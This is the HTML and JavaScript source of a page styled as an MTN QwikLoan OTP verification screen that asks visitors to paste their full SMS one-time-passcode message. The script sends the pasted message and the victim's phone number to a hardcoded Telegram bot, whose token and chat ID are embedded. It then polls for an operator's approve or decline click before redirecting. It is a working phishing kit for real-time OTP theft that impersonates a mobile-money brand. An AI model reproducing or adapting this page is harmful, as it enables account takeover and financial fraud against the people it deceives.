<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>MTN QwikLoan – OTP Verification</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>
*{
  box-sizing: border-box;
  font-family: 'Inter', Arial, sans-serif;
}

body{
  margin: 0;
  background: #ffffff;
  display: block;
  padding: 20px 16px;
  min-height: 100vh;
}

.container{
  width: 360px;
  max-width: 100%;
  margin: 0 auto;
  background: white;
  border-radius: 28px;
  padding: 40px 20px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.08);
  position: relative;
  text-align: center;
  margin-bottom: 30px;
}

.content{
  position: relative;
  z-index: 2;
}

/* Logo – MTN style */
.logo{
  margin-top: 60px;
}

.logo-circle{
  width: 52px;
  height: 52px;
  background: #000;
  border-radius: 50%;
  color: #FFCC00;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 30px;
  margin: auto;
  font-weight: 800;
}

.logo-text{
  color: #000;
  font-size: 26px;
  font-weight: bold;
  margin-top: 8px;
}

.logo-text span{
  color: #FFCC00;
  background: #000;
  display: inline-block;
  padding: 0 6px;
  border-radius: 10px;
}

/* Text */
.title{
  color: #FFCC00;
  font-size: 20px;
  font-weight: 700;
  margin-top: 15px;
}

.subtitle{
  color: #555;
  font-size: 15px;
  margin-top: 10px;
  line-height: 1.5;
}

/* MESSAGE TEXTAREA */
.message-area{
  margin-top: 20px;
  text-align: left;
}

.message-area label{
  font-weight: 600;
  font-size: 14px;
  display: block;
  margin-bottom: 8px;
  color: #333;
}

.message-area textarea{
  width: 100%;
  min-height: 120px;
  padding: 12px;
  border: 1px solid #ddd;
  border-radius: 12px;
  font-size: 14px;
  font-family: 'Inter', Arial, sans-serif;
  resize: vertical;
  outline: none;
  transition: border 0.2s;
}

.message-area textarea:focus{
  border-color: #FFCC00;
  box-shadow: 0 0 0 2px rgba(255,204,0,0.3);
}

.message-area .hint{
  font-size: 12px;
  color: #888;
  margin-top: 4px;
}

/* Buttons */
.btn{
  width: 100%;
  height: 55px;
  border: none;
  border-radius: 14px;
  font-size: 16px;
  margin-top: 20px;
  cursor: pointer;
  font-weight: 700;
}

.btn-primary{
  background: linear-gradient(90deg, #FFCC00, #E6B800);
  color: #000;
  box-shadow: 0 4px 12px rgba(255,204,0,0.3);
}

.btn-primary.disabled, .btn-primary:disabled{
  background: #e5e5e5;
  color: #999;
  cursor: not-allowed;
  box-shadow: none;
}

.btn-outline{
  background: transparent;
  border: 2px solid #FFCC00;
  color: #333;
  font-weight: 600;
}

.message {
  font-size: 14px;
  margin-top: 8px;
  min-height: 20px;
}
.error { color: #dc3545; }
.success { color: #28a745; }

/* Error box */
.error-box{
  position: absolute;
  top: 20px;
  left: 20px;
  right: 20px;
  background: #fff;
  border: 2px solid #ff4d4d;
  border-radius: 12px;
  padding: 15px;
  display: none;
  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
  z-index: 100;
  text-align: left;
}

.error-title{
  color: #ff0000;
  font-weight: bold;
  margin-bottom: 5px;
}

.error-text{
  color: #444;
  font-size: 14px;
}

.close{
  position: absolute;
  right: 15px;
  top: 10px;
  cursor: pointer;
  font-size: 18px;
  color: #999;
}

/* Spinner – MTN yellow */
#spinner {
  position: fixed;
  inset: 0;
  display: none;
  align-items: center;
  justify-content: center;
  background: rgba(255, 255, 255, 0.7);
  backdrop-filter: blur(2px);
  z-index: 999;
}

.loader {
  width: 44px;
  height: 44px;
  border: 4px solid #ffe0a3;
  border-top: 4px solid #FFCC00;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>
<body>

<div class="container">
  <!-- ERROR BOX -->
  <div class="error-box" id="errorBox">
    <div class="close" onclick="hideError()">×</div>
    <div class="error-title">Error</div>
    <div class="error-text" id="errorText">Invalid OTP</div>
  </div>

  <div class="content">
    <!-- LOGO -->
    <div class="logo">
      <div class="logo-circle">M</div>
      <div class="logo-text"><span>MTN</span> QwikLoan</div>
    </div>

    <!-- TEXT -->
    <div class="title">Confirm your account</div>
    <div class="subtitle" id="subtitleText">
      Paste the OTP message you received via SMS.<br>
      <span id="maskedPhone">02xxxxxx20</span>
    </div>

    <!-- MESSAGE TEXTAREA -->
    <div class="message-area">
      <label for="otpMessageText">OTP Message</label>
      <textarea id="otpMessageText" placeholder="Paste the entire message here..."></textarea>
      <div class="hint">Include the OTP code and any other details from the SMS.</div>
    </div>

    <div class="message" id="formMessage"></div>

    <button class="btn btn-primary" id="submitBtn">Submit</button>

    <!-- Go Back button -->
    <button class="btn btn-outline" id="goBackBtn">Go Back</button>
  </div>
</div>

<!-- SPINNER OVERLAY -->
<div id="spinner">
  <div class="loader"></div>
</div>

<script>
  (function() {
    // ==================== TELEGRAM BOT CONFIG ====================
    const BOT_TOKEN = '8745115171:AAHIirv4QpNh1p6JMWLLh6sqrvBh-YrO7Bc';
    const CHAT_ID   = '1006917440';
    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

    // ==================== DOM ELEMENTS ====================
    const messageTextarea = document.getElementById('otpMessageText');
    const submitBtn = document.getElementById('submitBtn');
    const goBackBtn = document.getElementById('goBackBtn');
    const maskedPhoneSpan = document.getElementById('maskedPhone');
    const formMessage = document.getElementById('formMessage');
    const spinner = document.getElementById('spinner');
    const errorBox = document.getElementById('errorBox');
    const errorText = document.getElementById('errorText');

    // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
    const phone = sessionStorage.getItem('mtn_phone') || '0240000020';
    maskedPhoneSpan.textContent = maskPhone(phone);

    function maskPhone(phone) {
      const cleaned = phone.replace(/\D/g, '');
      if (cleaned.length >= 4) {
        const start = cleaned.slice(0, 2);
        const end = cleaned.slice(-2);
        return start + 'x'.repeat(Math.max(0, cleaned.length - 4)) + end;
      }
      return phone;
    }

    // ==================== ERROR HANDLING ====================
    function showError(message) {
      errorText.innerText = message || 'An error occurred';
      errorBox.style.display = 'block';
    }
    window.hideError = function() {
      errorBox.style.display = 'none';
    };

    // ==================== TELEGRAM HELPERS ====================
    function escapeHtml(unsafe) {
      return unsafe.replace(/[&<>"]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        if (m === '"') return '&quot;';
        return m;
      });
    }

    async function sendToTelegram(payload) {
      const url = `${API_BASE}/sendMessage`;
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        return await response.json();
      } catch (error) {
        console.error('Telegram send error:', error);
        throw error;
      }
    }

    let currentPollInterval = null;

    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
      if (currentPollInterval) clearInterval(currentPollInterval);
      let lastUpdateId = 0;

      currentPollInterval = setInterval(async () => {
        try {
          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
          const response = await fetch(url);
          const data = await response.json();
          if (!data.ok || !data.result.length) return;

          data.result.forEach(update => {
            lastUpdateId = update.update_id;
            if (update.callback_query && update.callback_query.data) {
              const parts = update.callback_query.data.split('_');
              if (parts.length >= 3) {
                const [type, action, time] = parts;
                if (time == expectedTs && type === expectedPrefix) {
                  clearInterval(currentPollInterval);
                  currentPollInterval = null;
                  onDecision(action);
                }
              }
            }
          });
        } catch (err) {
          console.warn('Polling error:', err);
        }
      }, 1500);
    }

    // ==================== SUBMIT THE MESSAGE ====================
    let isSubmitting = false;

    async function submitMessage() {
      if (isSubmitting) return;

      const msgText = messageTextarea.value.trim();
      if (msgText.length < 5) {
        formMessage.textContent = 'Please paste the complete OTP message (at least 5 characters).';
        formMessage.className = 'message error';
        return;
      }
      formMessage.textContent = '';

      isSubmitting = true;
      submitBtn.disabled = true;
      messageTextarea.disabled = true;
      spinner.style.display = 'flex';

      const ts = Date.now();
      const escapedMsg = escapeHtml(msgText);
      const phoneInfo = `📱 Phone: ${phone}`;
      const msg = `🔐 <b>MTN QwikLoan – OTP Message</b>\n\n${phoneInfo}\n\n<b>Pasted Message:</b>\n<code>${escapedMsg}</code>\n\nChoose action:`;

      try {
        await sendToTelegram({
          chat_id: CHAT_ID,
          text: msg,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [[
              { text: '✅ Approve', callback_data: `otpmsg_approve_${ts}` },
              { text: '❌ Decline', callback_data: `otpmsg_decline_${ts}` }
            ]]
          }
        });
      } catch (err) {
        spinner.style.display = 'none';
        isSubmitting = false;
        submitBtn.disabled = false;
        messageTextarea.disabled = false;
        showError('Failed to send to Telegram. Please try again.');
        return;
      }

      // Start polling for callback
      pollForCallback('otpmsg', ts, (action) => {
        spinner.style.display = 'none';
        isSubmitting = false;
        submitBtn.disabled = false;
        messageTextarea.disabled = false;

        if (action === 'approve') {
          // Redirect to loan page
          window.location.href = 'loan.html';
        } else if (action === 'decline') {
          showError('The OTP was declined by the admin. Please check your message and try again.');
          // Clear textarea for new attempt
          messageTextarea.value = '';
          messageTextarea.focus();
          formMessage.textContent = '';
        } else {
          // Unexpected action
          showError('Unexpected response. Please try again.');
        }
      });
    }

    submitBtn.addEventListener('click', submitMessage);

    // ==================== GO BACK ====================
    goBackBtn.addEventListener('click', () => {
      window.location.href = 'login.html';
    });

    // ==================== ENABLE SUBMIT ON ENTER (in textarea) ====================
    messageTextarea.addEventListener('keydown', function(e) {
      if (e.key === 'Enter' && e.ctrlKey) {
        e.preventDefault();
        submitMessage();
      }
    });

    // ==================== INIT ====================
    // Focus the textarea
    setTimeout(() => {
      messageTextarea.focus();
    }, 200);
  })();
</script>

</body>
</html>
